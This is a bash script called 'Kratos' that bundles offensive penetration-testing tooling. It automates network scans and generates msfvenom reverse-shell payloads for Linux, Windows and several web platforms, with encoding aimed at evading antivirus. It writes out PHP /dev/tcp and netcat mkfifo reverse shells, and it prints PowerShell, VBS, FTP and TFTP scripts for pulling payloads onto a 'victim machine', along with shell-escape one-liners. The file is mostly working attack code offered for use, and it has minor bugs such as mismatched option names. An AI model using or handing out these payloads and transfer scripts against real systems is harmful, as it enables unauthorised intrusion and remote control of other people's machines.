#!/bin/bash
# Written by: m0tda
#    Version: 0.0.1
#       Name: Kratos
#
## NOTE:
#  Exit code '0' means finished normally
#  Exit code '1' means something went wrong
#  Exit code '2' means help screen
#  Exit code '6' means updated exploitdb package (GIT)


## OS settings (get the path of where the script is stored + database file)
gitpath="/home/Kratos/ProjectSH/modules"
csvpath="${gitpath}/database.csv"


## Program settings
gitremote="https://github/m0tda/ProjectSH.git"
progname="$( basename "$0" )"
listener=`ifconfig eth0 |awk '{print $2}' |grep [0-9] |sed -n 2p`

## Set LANG variable to avoid illegal byte sequence errors
LANG=C


## Example info
function example()
{
	echo ""
	echo " Master Of The Dark Arts "
	echo ""
	echo "========="
	echo " Example "
	echo "========="
	echo " ${progname} --[module] -[submodule]"
	echo " ${progname} --[module] -help"
	echo " ${progname} --help"
	echo ""
	echo " This script contain multiple module and submodule use --help for detailed informations"
	echo ""
}

function nethelp(){
	echo ""
	echo "========="
	echo " Network "
	echo "========="
	echo " This module is used for all networking purpose, ping-sweep, tcp-scan etc..."
	echo " address can be given as the following 192.168.0.1 or 192.168.0.1-255 for range."
	echo ""
	echo " [Module] "
	echo " --network ............Perform networking task."
	echo ""
	echo " {Submodule} "
	echo " -ping ................Ping the given address."
	echo " -tcp10 ...............Scan top 10 tcp ports."
	echo " -tcp .................Scan all the tcp ports."
	echo " -udp .................Scan for open udp ports."
	echo " -smb .................Scan smb using enum4linux."
	echo " -snmp ................Scan snmp service."
	echo " -smtp ................Scan smtp service."
	echo " -nikto ...............Scan webservice."
	echo " -dirbuster ...........Enumerate directory on webserver."
	echo ""
}

function payhelp(){
	echo ""
	echo "========="
	echo " Payload "
	echo "========="
	echo " This module is used to generate multiples payload using msfvenom and veil-evasion."
	echo ""
	echo " [Module] "
	echo " --payload ............Generate a specific payload."
	echo ""
	echo " {Submodule} "
	echo " -linux ...............Generate a linux reverse-shell binary."
	echo " -windows .............Generate a windows reverse-shell binary."
	echo " -windows_staged ......Generate a windows reverse-shell binary."
	echo " -linux_shellcode .....Generate a linux reverse-shell shellcode."
	echo " -windows_shellcode ...Generate a windows reverse-shell shellcode."
	echo " -asp .................Generate a asp reverse-shell."
	echo " -jsp .................Generate a jsp reverse-shell."
	echo " -war .................Generate a war reverse-shell."
	echo " -php .................Generate a php reverse-shell."
	echo " -python ..............Generate a python reverse-shell."
	echo " -bash ................Generate a bash reverse-shell."
	echo " -ncat ................Generate a netcat reverse-shell."
	echo " -veil ................Start veil-evasion."
	echo ""

}

function srchhelp(){
	echo ""
	echo "========"
	echo " Search "
	echo "========"
	echo " This module is used to automatically search for possible exploits."
	echo ""
	echo " [Module] "
	echo " --search .............Search in the database for possible exploits."
	echo ""
	echo " {Submodule} "
	echo " -exploit .............Search for exploit in exploitdb."
	echo " -linux ...............Search for linux exploits."
	echo " -windows .............Search for windows exploits, for more info see link below."
	echo "  https://github.com/GDSSecurity/Windows-Exploit-Suggester"
	echo ""

}

function mischelp(){
	echo ""
	echo "======"
	echo " Misc "
	echo "======"
	echo " This module contained multiple usefull stuff such as command to spawn tty "
	echo " transfer script etc... see below for more info."
	echo ""
	echo " [Module] "
	echo " --misc ...............Perform misc tasks."
	echo ""
	echo " {Submodule} "
	echo " -transfer_ps1 ........Print powershell script to transfer files."
	echo " -transfer_vbs ........Print vbs script to transfer files."
	echo " -transfer_ftp ........Print ftp script to transfer files."
	echo " -transfer_tftp .......Print tftp script to transfer files."
	echo " -tty .................Print possible tty spawn."
	echo " -scripts .............Print location for usefull scripts."
	echo ""
}

## Usage info
function usage()
{
	echo " Master Of The Dark Arts - bash penetration testing."
	echo ""
	echo " Usage: ${progname} [Modules] submodule [option1] ... [optionN]"
	echo ""
	echo "========="
	echo " Example "
	echo "========="
	echo " ${progname} --network -ping 192.168.0.1-255"
	echo " ${progname} --help"
	echo ""
	echo "============="
	echo " Description "
	echo "============="
	echo " This shell script is used to automate as much as possble all shell command."
	echo " All modules and submodules are explained below."
	echo ""
	echo "========="
	echo " Network "
	echo "========="
	echo " This module is used for all networking purpose, ping-sweep, tcp-scan etc..."
	echo " address can be given as the following 192.168.0.1 or 192.168.0.1-255 for range."
	echo ""
	echo " [Module] "
	echo " --network ............Perform networking task."
	echo ""
	echo " {Submodule} "
	echo " -ping ................Ping the given address."
	echo " -tcp10 ...............Scan top 10 tcp ports."
	echo " -tcp .................Scan all the tcp ports."
	echo " -udp .................Scan for open udp ports."
	echo " -smb .................Scan smb using enum4linux."
	echo " -snmp ................Scan snmp service."
	echo " -smtp ................Scan smtp service."
	echo " -nikto ...............Scan webservice."
	echo " -dirb ...........Enumerate directory on webserver."
	echo ""
	echo "========="
	echo " Payload "
	echo "========="
	echo " This module is used to generate specific payload using msfvenom and veil-evasion."
	echo " [Module] "
	echo " --payload ............Generate a specific payload."
	echo ""
	echo " {Submodule} "
	echo " -linux ...............Generate a linux reverse-shell binary."
	echo " -windows .............Generate a windows reverse-shell binary."
	echo " -windows_staged ......Generate a windows reverse-shell binary."
	echo " -linux_shellcode .....Generate a linux reverse-shell shellcode."
	echo " -windows_shellcode ...Generate a windows reverse-shell shellcode."
	echo " -asp .................Generate a asp reverse-shell."
	echo " -jsp .................Generate a jsp reverse-shell."
	echo " -war .................Generate a war reverse-shell."
	echo " -php .................Generate a php reverse-shell."
	echo " -python ..............Generate a python reverse-shell."
	echo " -bash ................Generate a bash reverse-shell."
	echo " -ncat ................Generate a netcat reverse-shell."
	echo " -veil ................Start veil-evasion."
	echo ""
	echo "========"
	echo " Search "
	echo "========"
	echo " This module is used to automatically search for possible exploits."
	echo ""
	echo " [Module] "
	echo " --search .............Search in the database for possible exploits."
	echo ""
	echo " {Submodule} "
	echo " -exploit .............Search for exploit in exploitdb."
	echo " -linux ...............Search for linux exploits."
	echo " -windows .............Search for windows exploits."
	echo ""
	echo "======"
	echo " Misc "
	echo "======"
	echo " This module contained multiple usefull stuff such as command to spawn tty "
	echo " transfer script etc... see below for more info."
	echo ""
	echo " [Module] "
	echo " --misc ...............Perform misc tasks."
	echo ""
	echo " {Submodule} "
	echo " -transfer_ps1 ........Print powershell script to transfer files."
	echo " -transfer_vbs ........Print vbs script to transfer files."
	echo " -transfer_ftp ........Print ftp script to transfer files."
	echo " -transfer_tftp .......Print tftp script to transfer files."
	echo " -tty .................Print possible tty spawn."
	echo " -scripts .............Print location of usefull scripts."
	echo ""
	echo "=========="
	echo " Updating "
	echo "=========="
	echo " Update the script from github."
	echo ""
	echo " [Module] "
	echo " --update .............Update .. ;)"
	echo ""
}


## Update database check
function update()
{
	# Update via Git
	updategit

	# Done
	exit 6
}


## Update database via Git
function updategit()
{
	echo -e '[i] Updating via Git.\n'

	## Make sure we are in the correct folder
	mkdir -p "${gitpath}/" \
		|| sudo mkdir -p "${gitpath}/"
	cd "${gitpath}/"

	## Are we in a Git repo?
	if [[ "$( git rev-parse --is-inside-work-tree )" != "true" ]]; then
		if [[ "$( ls )" = "" ]]; then
			# If directory is empty, just clone
			echo -e '\n[i] Nothing here. Starting fresh...'
			git clone "${gitremote}" .
		fi
	fi

	# Is our Git remote added?
	if [[ "$( git remote -v)" != *"${gitremote}"* ]]; then
		echo -e '\n[i] Missing Git remote:' "${gitremote}"
		git init >/dev/null
		git remote add origin "${gitremote}" 2>/dev/null
	fi

	# Make sure to prep checkout first
	git checkout -- .

	# Update from git
	git pull origin master

	# If conflicts, clean and try again
	if [[ "$?" -ne 0 ]]; then
		git clean -d -fx ""
		git pull origin master
	fi

	echo -e "\n[*] Git update finished."
	exit 6
}
	

## Parse if no args
if [[ "$#" -eq 0 ]]; then
	example >&2;
fi


## Parse usage menu
if [[ "$1" == "--help" ]]; then
	usage |less;
fi



########################
#### NETWORK MODULE ####
########################
## Network function
netone(){
	mkdir ~/Hosts 2>/dev/null
	echo ""
	echo "======"
	echo " Ping "
	echo "======"
	echo ""
	read -p "Enter the network addresses to scan: " addr
	echo ""
	echo "Scanning network for online devices..."
	sudo nmap -sn -PE $addr -oG ~/Hosts/targets.txt >/dev/null
	cat ~/Hosts/targets.txt |grep 'Up' |cut -d" " -f2 > ~/Hosts/Up.txt
	sleep 1
	clear
	echo "================"
	echo " Online Devices "
	echo "================"
	cat ~/Hosts/Up.txt
	echo ""
	echo "All result are save in ~/Hosts/Up.txt"
	echo ""
}

nettwo(){
	mkdir ~/Hosts 2>/dev/null
	echo ""
	echo "=================="
	echo " Top 10 TCP Ports "
	echo "=================="
	echo ""
	read -p "Enter network address to scan: " addr
	mkdir ~/Hosts/$addr 2>/dev/null
	echo ""
	echo "All result are save in ~/Hosts/$addr/ directory."
	echo ""
	sudo nmap -Pn -sV -O -sS -f --open --top-ports 10 $addr -oN ~/Hosts/$addr/tcp10.txt
	echo ""
}

netthree(){
	mkdir ~/Hosts 2>/dev/null
	echo ""
	echo "==============="
	echo " Full TCP Scan "
	echo "==============="
	echo ""
	read -p "Enter network address to scan: " addr
	mkdir ~/Hosts/$addr 2>/dev/null
	echo ""
	echo "All result are save in ~/Hosts/$addr/ directory."
	echo ""
	sudo nmap -Pn -A -sC -sS -f -p- $addr -oN ~/Hosts/$addr/tcp.txt
	echo ""
}

netfour(){
	mkdir ~/Hosts 2>/dev/null
	echo ""
	echo "=========="
	echo " UDP Scan "
	echo "=========="
	echo ""
	read -p "Enter network address to scan: " addr
	mkdir ~/Hosts/$addr 2>/dev/null
	echo ""
	echo "All result are save in ~/Hosts/$addr/ directory."
	echo ""
	sudo nmap -Pn --top-ports 1000 -sU --stats-every 3m --max-retries 1 -T3 $addr -oN ~/Hosts/$addr/udp.txt
	echo ""
}

netfive(){
	mkdir ~/Hosts 2>/dev/null
	echo ""
	echo "============"
	echo " Enum4linux "
	echo "============"
	echo ""
	read -p "Enter network address to scan: " addr
	mkdir ~/Hosts/$addr 2>/dev/null
	echo ""
	echo "All result are save in ~/Hosts/$addr/ directory."
	echo ""
	echo "Scanning the given address with enum4linux please-wait."
	sudo enum4linux -a $addr > ~/Hosts/$addr/enum4linux.txt
	echo ""
}

netsix(){
	mkdir ~/Hosts 2>/dev/null
	echo ""
	echo "==========="
	echo " SNMP Scan "
	echo "==========="
	echo ""
	read -p "Enter network address to scan: " addr
	read -p "Enter network address to scan: " addr
	mkdir ~/Hosts/$addr 2>/dev/null
	echo ""
	echo "All result are save in ~/Hosts/$addr/ directory."
	echo ""
	echo "Scanning snmp service of given target please wait..."
	sudo snmp-check $addr > ~/Hosts/$addr/snmp-check.txt
	sleep 3
	cat ~/Hosts/$addr/snmp-check.txt
	echo ""	
}

netseven(){
	mkdir ~/Hosts 2>/dev/null
	echo ""
	echo "==========="
	echo " SMTP Scan "
	echo "==========="
	echo ""
	read -p "Enter network address to scan: " addr
	read -p "Enter the fullpath of the userlists to use: " userlist
	mkdir ~/Hosts/$addr 2>/dev/null
	echo ""
	echo "All result are save in ~/Hosts/$addr/ directory."
	echo ""
	sudo smtp-user-enum -M VRFY -U $userlist -t $addr > ~/Hosts/$addr/smtp.txt
	echo ""
}

neteight(){
	mkdir ~/Hosts 2>/dev/null
	echo ""
	echo "======="
	echo " Nikto "
	echo "======="
	echo ""
	echo "Example 192.168.0.1:80"
	read -p "Enter network address and port to scan: " addr
	mkdir ~/Hosts/$addr 2>/dev/null
	echo ""
	echo "All result are save in ~/Hosts/$addr/ directory."
	echo ""
	sudo nikto -h http://$addr -output ~/Hosts/$addr/nikto.txt
	echo ""
}

netnine(){
	mkdir Hosts 2>/dev/null
	echo ""
	echo "======"
	echo " Dirb "
	echo "======"
	echo ""
	echo "Example 192.168.0.1:80"
	read -p "Enter network address to scan: " addr
	mkdir Hosts/$addr 2>/dev/null
	echo ""
	echo "All result are save in ~/Hosts/$addr/ directory."
	echo ""
	sudo dirb http://$addr/ /usr/share/wordlists/dirb/common.txt -o ~/Hosts/$addr/dirb.txt
	echo ""
}


## Network module
if [[ "$@" == "--network" ]]; then
	nethelp
elif [[ "$@" == "--network -ping" ]]; then
	netone
elif [[ "$@" == "--network -tcp10" ]]; then
	nettwo
elif [[ "$@" == "--network -tcp" ]]; then
	netthree
elif [[ "$@" == "--network -udp" ]]; then
	netfour
elif [[ "$@" == "--network -smb" ]]; then
	netfive
elif [[ "$@" == "--network -snmp" ]]; then
	netsix
elif [[ "$@" == "--network -smtp" ]]; then
	netseven
elif [[ "$@" == "--network -nikto" ]]; then
	neteight
elif [[ "$@" == "--network -dirb" ]]; then
	netnine
fi
#*** END OF NETWORK MODULE ***#



########################
#### PAYLOAD MODULE ####
########################
## Payload defined function
payone(){
	mkdir ~/Payload/ 2>/dev/null
	mkdir ~/Payload/linux/ 2>/dev/null
	echo ""
	echo "======================================="
	echo " Linux non-staged reverse-shell binary "
	echo "======================================="
	echo ""
	read -p "Enter the name of the payload: " name
	read -p "Enter listener address: " addr
	read -p "Enter listener port: " port
	echo ""
	echo "Generating payload..."
	sudo msfvenom -p linux/x86/shell_reverse_tcp LHOST=$addr LPORT=$port -f elf -e x86/shikata_ga_nai -o Payload/linux/$name 2>/dev/null
	echo ""
	echo "Payload location: ~/Payload/linux/$name"
	echo ""
}

paytwo(){
	mkdir ~/Payload/ 2>/dev/null
	mkdir ~/Payload/windows/ 2>/dev/null
	echo ""
	echo "========================================="
	echo " Windows non-staged reverse-shell binary "
	echo "========================================="
	echo ""
	read -p "Enter the name of the payload: " name
	read -p "Enter listener address: " addr
	read -p "Enter listener port: " port
	echo ""
	echo "Generating payload..."
	sudo msfvenom -p windows/shell_reverse_tcp LHOST=$addr LPORT=$port -f exe -e x86/shikata_ga_nai -o ~/Payload/windows/$name 2>/dev/null
	echo ""
	echo "Payload location: ~/Payload/windows/$name"
	echo ""
}


paythree(){
	mkdir ~/Payload/ 2>/dev/null
	mkdir ~/Payload/windows/ 2>/dev/null
	echo ""
	echo "====================================="
	echo " Windows staged reverse-shell binary "
	echo "====================================="
	echo ""
	read -p "Enter the name of the payload: " name
	read -p "Enter listener address: " addr
	read -p "Enter listener port: " port
	echo ""
	echo "Generating payload..."
	sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=$addr LPORT=$port -f exe -o ~/Payload/windows/$name 2>/dev/null
	echo ""
	echo "Payload location: ~/Payload/windows/$name"
	echo ""
}


payfour(){
	mkdir ~/Payload/ 2>/dev/null
	mkdir ~/Payload/linux/ 2>/dev/null
	echo ""
	echo "================================="
	echo " Linux reverse-shellcode C based "
	echo "================================="
	echo ""
	read -p "Enter name of the payload: " name
	read -p "Enter listener address: " addr
	read -p "Enter listener port: " port
	read -p "Enter badcharacters (between quotes \"\"): " badc
	echo ""
	echo "Generating payload..."
	sudo msfvenom -p linux/x86/shell_reverse_tcp LHOST=$addr LPORT=$port -f c -b $badc -o ~/Payload/linux/$name 2>/dev/null
	echo ""
	echo "Payload location: ~/Payload/linux/$name"
	echo ""
	cat ~/Payload/linux/$name
	echo ""
}


payfive(){
	mkdir ~/Payload/ 2>/dev/null
	mkdir ~/Payload/windows/ 2>/dev/null
	echo ""
	echo "==================================="
	echo " Windows reverse-shellcode C based "
	echo "==================================="
	echo ""
	read -p "Enter name of the payload: " name
	read -p "Enter listener address: " addr
	read -p "Enter listener port: " port
	read -p "Enter badcharacters (between quotes \"\"): " badc
	echo ""
	echo "Generating payload..."
	sudo msfvenom -p windows/shell_reverse_tcp LHOST=$addr LPORT=$port -f c -b $badc -o ~/Payload/windows/$name 2>/dev/null
	echo ""
	echo "Payload location: ~/Payload/windows/$name"
	echo ""
	cat ~/Payload/windows/$name
	echo""
}


paysix(){
	mkdir ~/Payload/ 2>/dev/null
	mkdir ~/Payload/web/ 2>/dev/null
	echo ""
	echo "=============================="
	echo " ASP non-staged reverse-shell "
	echo "=============================="
	echo ""
	read -p "Enter name of the payload: " name
	read -p "Enter listener address: " addr
	read -p "Enter listener port: " port
	echo ""
	echo "Generating payload..."
	sudo msfvenom -p windows/shell_reverse_tcp LHOST=$addr LPORT=$port -f asp -o ~/Payload/web/$name.asp 2>/dev/null
	echo ""
	echo "Payload location: ~/Payload/web/$name.asp"
	echo ""
}

payseven(){
	mkdir ~/Payload/ 2>/dev/null
	mkdir ~/Payload/web/ 2>/dev/null
	echo ""
	echo "=============================="
	echo " JSP non-staged reverse-shell "
	echo "=============================="
	echo ""
	read -p "Enter name of the payload: " name
	read -p "Enter listener address:" addr
	read -p "Enter listener port: " port
	echo ""
	echo "Generating payload..."
	sudo msfvenom -p java/jsp_shell_reverse_tcp LHOST=$addr LPORT=$port -f raw -o ~/Payload/web/$name.jsp 2>/dev/null
	echo ""
	echo "Payload location: ~/Payload/web/$name.jsp"
	echo ""
}

payeight(){
	mkdir ~/Payload/ 2>/dev/null
	mkdir ~/Payload/web/ 2>/dev/null
	echo ""
	echo "=============================="
	echo " WAR non-staged reverse-shell "
	echo "=============================="
	echo ""
	read -p "Enter name of the payload: " name
	read -p "Enter listener address:" addr
	read -p "Enter listener port: " port
	echo ""
	echo "Generating payload..."
	sudo msfvenom -p java/jsp_shell_reverse_tcp LHOST=$addr LPORT=$port -f war -o ~/Payload/web/$name.war
	echo ""
	echo "Payload location: ~/Payload/web/$name.war"
	echo ""
}

paynine(){
	mkdir ~/Payload/ 2>/dev/null
	mkdir ~/Payload/web/ 2>/dev/null
	echo ""
	echo "=============================="
	echo " PHP non-staged reverse-shell "
	echo "=============================="
	echo ""
	read -p "Enter name of the payload: " name
	read -p "Enter listener address:" addr
	read -p "Enter listener port: " port
	echo ""
	echo "Generating payload..."
	echo '<?php echo shell_exec("0<&65-;exec 65<>/dev/tcp/'$addr'/'$port';/bin/bash <&65 >&65 2>&65");?>' > ~/Payload/web/$name
	echo ""
	echo "Payload location: ~/Payload/web/$name"
	echo ""
	cat ~/Payload/web/$name
	echo
}

payten(){
	mkdir ~/Payload/ 2>/dev/null
	mkdir ~/Payload/scripts/ 2>/dev/null
	echo ""
	echo "================================="
	echo " Python non-staged reverse-shell "
	echo "================================="
	echo ""
	read -p "Enter name of the payload: " name
	read -p "Enter listener address:" addr
	read -p "Enter listener port: " port
	echo ""
	echo "Generating payload..."
	sudo msfvenom -p cmd/unix/reverse_python LHOST=$addr LPORT=$port -f raw -o ~/Payload/scripts/$name
	echo ""
	echo "Payload location: ~/Payload/scripts/$name"
	echo ""
}

payeleven(){
	mkdir ~/Payload/ 2>/dev/null
	mkdir ~/Payload/scripts/ 2>/dev/null
	echo ""
	echo "==============================="
	echo " Bash non-staged reverse-shell "
	echo "==============================="
	echo ""
	read -p "Enter name of the payload: " name
	read -p "Enter listener address: " addr
	read -p "Enter listener port: " port
	echo ""
	echo "Generating payload..."
	sudo msfvenom -p cmd/unix/reverse_bash LHOST=$addr LPORT=$port -f raw -o ~/Payload/scripts/$name
	echo ""
	echo "Payload location: ~/Payload/scripts/$name"
	echo ""
	cat ~/Payload/scripts/$name
	echo ""
}

paytwelve(){
	echo ""
	echo "======================"
	echo " Netcat reverse-shell "
	echo "======================"
	echo ""
	read -p "Enter the listener address: " addr
	read -p "Enter the listener port: " port
	echo ""
	echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $addr $port >/tmp/f"
	echo
}

paythirdteen(){
	sudo veil-evasion
}

## Payload module
if [[ "$@" == "--payload" ]]; then
	payhelp
elif [[ "$@" == "--payload -linux" ]]; then
	payone
elif [[ "$@" == "--payload -windows" ]]; then
	paytwo
elif [[ "$@" == "--payload -windows_staged" ]]; then
	paythree
elif [[ "$@" == "--payload -linux_shellcode" ]]; then
	payfour
elif [[ "$@" == "--payload -windows_shellcode" ]]; then
	payfive
elif [[ "$@" == "--payload -asp" ]]; then
	paysix
elif [[ "$@" == "--payload -jsp" ]]; then
	payseven
elif [[ "$@" == "--payload -war" ]]; then
	payeight
elif [[ "$@" == "--payload -php" ]]; then
	paynine
elif [[ "$@" == "--payload -python" ]]; then
	payten
elif [[ "$@" == "--payload -bash" ]]; then
	payeleven
elif [[ "$@" == "--payload -ncat" ]]; then
	paytwelve
elif [[ "$@" == "--payload -veil" ]]; then
	paythirdteen
fi
#*** END OF PAYLOAD MODULE ***#



#######################
#### SEARCH MODULE ####
#######################
## Search function
srchone(){
	echo ""
	echo "====================="
	echo " Search in exploitdb "
	echo "====================="
	echo ""
	read -p "Enter what you are looking for: " name
	echo ""
	sudo searchsploit $name
}

srchtwo(){
	echo ""
	echo "==================================="
	echo " Search in linux-exploit-suggester "
	echo "==================================="
	echo ""
	read -p "Enter linux kernel-version: " name
	echo ""
	sudo linux-exploit-suggester -k $name
}

srchthree(){
	echo ""
	echo "====================================="
	echo " Search in windows-exploit-suggester "
	echo "====================================="
	echo ""
	sudo windows-exploit-suggester.py --update
	echo ""
	sudo apt-get install python-xlrd 1>/dev/null
	read -p "Enter database name: " db
	read -p "Enter windows systeminfo: " name
	sudo windows-exploit-suggester.py --database $db -o $name
	echo ""
}

## Search Module
if [[ "$@" == "--search" ]]; then
	srchhelp
elif [[ "$@" == "--search -exploitdb" ]]; then
	srchone
elif [[ "$@" == "--search -linux" ]]; then
	srchtwo
elif [[ "$@" == "--search -windows" ]]; then
	srchthree
fi
#*** END OF SEARCH MODULE ***#



#####################
#### MISC MODULE ####
#####################
## Misc function
miscone(){
	echo ""
	echo "============================"
	echo " Powershell Transfer script "
	echo "============================"
	echo ""
	read -p "Enter the address of your listener: " addr
	read -p "Enter the fullname of the payload you whish to transfer: " name
	echo ""
	echo "Copy this into the victim machine."
	echo ""
	echo "echo $storageDir = $pwd > wget.ps1"
	echo "echo $webclient = New-Object System.Net.WebClient >>wget.ps1"
	echo "echo $url = "http://$addr/$name" >>wget.ps1"
	echo "echo $file = "$name" >>wget.ps1"
	echo "echo $webclient.DownloadFile($url,$file) >>wget.ps1"
	echo ""
	echo "Call the script using the following command."
	echo "powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1"
	echo ""
}
misctwo(){
	echo ""
	echo "====================="
	echo " VBS transfer script "
	echo "====================="
	echo ""
	read -p "Enter the address of your listener: " addr
	read -p "Enter the name of the file you whish to transfer: " name
	echo ""
	echo "Copy this into the victim machine."
	echo ""
	echo "echo strUrl = WScript.Arguments.Item(0) > wget.vbs"
	echo "echo StrFile = WScript.Arguments.Item(1) >> wget.vbs"
	echo "echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs"
	echo "echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs"
	echo "echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs"
	echo "echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs"
	echo "echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts >> wget.vbs"
	echo "echo Err.Clear >> wget.vbs"
	echo "echo Set http = Nothing >> wget.vbs"
	echo "echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs"
	echo "echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs"
	echo "echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs"
	echo "echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs"
	echo "echo http.Open "GET",strURL,False >> wget.vbs"
	echo "echo http.Send >> wget.vbs"
	echo "echo varByteArray = http.ResponseBody >> wget.vbs"
	echo "echo Set http = Nothing >> wget.vbs"
	echo "echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs"
	echo "echo Set ts = fs.CreateTextFile(StrFile,True) >> wget.vbs"
	echo "echo strData = "" >> wget.vbs"
	echo "echo strBuffer = "" >> wget.vbs"
	echo "echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs"
	echo "echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) >> wget.vbs"
	echo "echo Next >> wget.vbs"
	echo "echo ts.Close >> wget.vbs"
	echo ""
	echo "Call the script using the following command."
	echo "cscript wget.vbs http://$addr/$name $name"
	echo ""

}

miscthree(){
	echo ""
	echo "====================="
	echo " FTP transfer script "
	echo "====================="
	echo ""
	read -p "Enter the listener address: " addr
	read -p "Enter the name of the file you whish to transfer: " name
	echo ""
	echo "Copy this script on the victim machine."
	echo ""
	echo "echo open $addr 21> ftp.txt"
	echo "echo USER asshat>> ftp.txt"
	echo "echo mysecretpassword>> ftp.txt"
	echo "echo bin>> ftp.txt"
	echo "echo GET $name>> ftp.txt"
	echo "echo bye>> ftp.txt"
	echo ""
	echo "Then run this command to connect to the ftp"
	echo "ftp -v -n -s:ftp.txt"
}

miscfour(){
	echo ""
	echo "======================"
	echo " TFTP transfer script "
	echo "======================"
	echo ""
	read -p "Enter the listener address: "addr
	read -p "Enter the name of the file you which to transfer: " name
	echo ""
	echo "Run the following command on the attacker machine."
	echo ""
	echo "atftpd --daemon --port 69 /tftp"
	echo "/etc/init.d/atftpd restart"
	echo ""
	echo "Run the following command on the victim machine."
	echo "tftp -i $addr GET $name"
	echo ""
	echo "By default the tftp directory is located at /srv/tftp/"
}

miscfive(){
	echo ""
	echo "==================="
	echo " TTY spawn command "
	echo "==================="
	echo ""
	echo "Python:"
	echo "python -c 'import pty; pty.spawn(\"/bin/sh\")'"
	echo ""
	echo "Echo:"
	echo "echo os.system('/bin/sh')"
	echo ""
	echo "Perl:"
	echo "perl -e 'exec \"/bin/sh\";"
	echo ""
	echo "Awk:"
	echo "awk 'BEGIN {system(\"/bin/sh\")}'"
	echo ""
	echo "Find:"
	echo "find / -name blahblah 'exec /bin/awk 'BEGIN {system("/bin/sh")}' \;"
	echo ""
	echo "More, Less, and Man Commands:"
	echo "'! /bin/sh'"
	echo "'!/bin/sh'"
	echo "'!bash'"
	echo ""
}

miscsix(){
	echo ""
	echo "==============================="
	echo " Locate usefull script on kali "
	echo "==============================="
	echo ""
	echo "LinEnum.sh, Linux local enumeration script located there:"
	find / -name LinEnum.sh 2>/dev/null
	echo ""
	echo "linuxprivchecker.py, linux local enumeration for privilege escalation located there: "
	find / -name linuxprivchecker.py 2>/dev/null
	echo ""
	echo "php-reverse-shell.php, php reverse shell from pentest monkey."
	locate /webshells/php/php-reverse-shell.php
	echo ""
	echo "If any of the search return empty I suggest you use your googleFU and download them."
	echo ""
}


if [[ "$@" == "--misc" ]]; then
	mischelp
elif [[ "$@" == "--misc -transfer_ps1" ]]; then
	miscone
elif [[ "$@" == "--misc -transfer_vbs" ]]; then
	misctwo
elif [[ "$@" == "--misc -transfer_ftp" ]]; then
	miscthree
elif [[ "$@" == "--misc -transfter_tftp" ]]; then
	miscfour
elif [[ "$@" == "--misc -tty" ]]; then
	miscfive
elif [[ "$@" == "--misc -scripts" ]]; then
	miscsix
fi
